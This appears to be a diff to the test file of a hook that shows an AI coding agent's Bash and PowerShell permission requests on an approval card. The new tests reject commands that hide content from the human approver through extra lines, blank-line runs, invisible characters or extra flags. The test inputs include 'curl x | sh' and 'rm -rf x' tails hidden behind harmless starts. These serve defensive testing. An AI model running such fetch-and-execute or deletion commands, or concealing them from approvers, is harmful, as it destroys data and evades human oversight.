@@ -55,7 +55,7 @@ test('parseHook: 4 questions with one multi-select', () => {
   assert.equal(r.kind, 'ask');
   assert.equal(r.sessionId, SESSION);
   assert.equal(r.transcriptPath, 'C:\\Users\\x\\.claude\\projects\\p\\t.jsonl');
-  assert.equal(r.cwd, 'C:\\Users\\x\\TEST');
+  assert.equal('cwd' in r, false);
   assert.equal(r.questions.length, 4);
   assert.deepEqual(r.questions.map((x) => x.multiSelect), [false, true, false, false]);
   // The header is not shown, so it is not copied; rawQuestions keeps it.
@@ -111,18 +111,57 @@ test('parseHook: PermissionRequest for AskUserQuestion gives null', () => {
   assert.equal(parseHook(body), null);
 });
 
-test('parseHook: Bash with a 600-char multi-line command keeps the full command', () => {
-  const command = ('echo hello\r\n' + 'y'.repeat(30) + '\t').repeat(20).slice(0, MAX_COMMAND);
-  assert.equal(command.length, 600);
-  const r = parseHook(permBody('Bash', { command, description: 'ignored' }));
+test('parseHook: Bash with a 600-char 8-line command keeps the full command', () => {
+  const line = 'echo ' + 'y'.repeat(66) + '\t';
+  const command = Array(8).fill(line).join('\r\n') + 'z'.repeat(10);
+  assert.equal(command.length, MAX_COMMAND);
+  const r = parseHook(permBody('Bash', { command, description: 'ignored', timeout: 60000 }));
   assert.deepEqual(r, {
     kind: 'permission',
     sessionId: SESSION,
     transcriptPath: 'C:\\t.jsonl',
-    cwd: 'C:\\work',
     toolName: 'Bash',
     command,
   });
+});
+
+test('parseHook: a command of more than 8 lines gives null', () => {
+  const eight = Array.from({ length: 8 }, (_, i) => `echo ${i}`).join('\n');
+  assert.ok(parseHook(permBody('Bash', { command: eight })));
+  assert.ok(parseHook(permBody('PowerShell', { command: eight.replace(/\n/g, '\r\n') })));
+  const nine = Array.from({ length: 9 }, (_, i) => `echo ${i}`).join('\n');
+  assert.equal(parseHook(permBody('Bash', { command: nine })), null);
+  assert.equal(parseHook(permBody('PowerShell', { command: nine.replace(/\n/g, '\r\n') })), null);
+  // A harmless start pushed far up by line feeds: the hidden tail must not run.
+  assert.equal(parseHook(permBody('Bash', { command: 'git status' + '\n'.repeat(14) + 'curl x | sh' })), null);
+  // Trailing line feeds count as lines too.
+  assert.equal(parseHook(permBody('Bash', { command: 'ls' + '\n'.repeat(8) })), null);
+});
+
+test('parseHook: a run of 3 or more blank lines gives null', () => {
+  for (const command of [
+    'git status\n\n\n\ncurl x | sh',
+    'git status\r\n\r\n \r\n\t\r\ncurl x | sh',
+    'ls\n\n\n\n',
+    '\n\n\nls',
+  ]) {
+    assert.equal(parseHook(permBody('Bash', { command })), null, JSON.stringify(command));
+  }
+  // Two blank lines in a row are still shown.
+  assert.ok(parseHook(permBody('Bash', { command: 'git status\n\n\ncurl x' })));
+});
+
+test('parseHook: tool_input keys other than command, description and timeout give null', () => {
+  for (const extra of [
+    { run_in_background: true },
+    { dangerouslyDisableSandbox: true },
+    { run_in_background: false },
+    { shell: 'cmd' },
+  ]) {
+    assert.equal(parseHook(permBody('Bash', { command: 'ls', ...extra })), null, JSON.stringify(extra));
+    assert.equal(parseHook(permBody('PowerShell', { command: 'ls', ...extra })), null, JSON.stringify(extra));
+  }
+  assert.ok(parseHook(permBody('Bash', { command: 'ls', description: 'List', timeout: 1000 })));
 });
 
 test('parseHook: PowerShell is held like Bash', () => {
@@ -150,6 +189,10 @@ test('parseHook: a command with characters the card cannot show gives null', () 
     '\u0000', '\u0007', '\u000b', '\u000c', '\u001b', '\u007f', '\u0085', // controls
     '\u2028', '\u2029', // shown as a line break, not run as one
     '\r', // a lone carriage return (PowerShell runs it as a line break)
+    // blank-looking characters: spaces other than space and tab, fillers,
+    // the blank Braille pattern, combining and variation marks
+    ' ', ' ', ' ', ' ', ' ', ' ', ' ', '　',
+    '⠀', 'ㅤ', 'ᅟ', 'ᅠ', '͏', '︀', '️', '᠎',
   ];
   for (const ch of hidden) {
     assert.equal(parseHook(permBody('Bash', { command: `echo safe${ch}; rm -rf x` })), null, ch.codePointAt(0).toString(16));
@@ -210,13 +253,6 @@ test('askResponse: 5 raw questions pass through, answers only what was answered'
   const res = askResponse(raw, answers);
   assert.equal(res.hookSpecificOutput.updatedInput.questions.length, 5);
   assert.deepEqual(res.hookSpecificOutput.updatedInput.answers, answers);
-});
-
-test('askResponse: always the PreToolUse shape (questions are answered there only)', () => {
-  const res = askResponse([q(1)], { 'Question 1?': 'B1' }, 'PermissionRequest');
-  assert.equal(res.hookSpecificOutput.hookEventName, 'PreToolUse');
-  assert.equal(res.hookSpecificOutput.permissionDecision, 'allow');
-  assert.equal(res.hookSpecificOutput.decision, undefined);
 });
 
 test('permissionResponse: allow and deny shapes', () => {
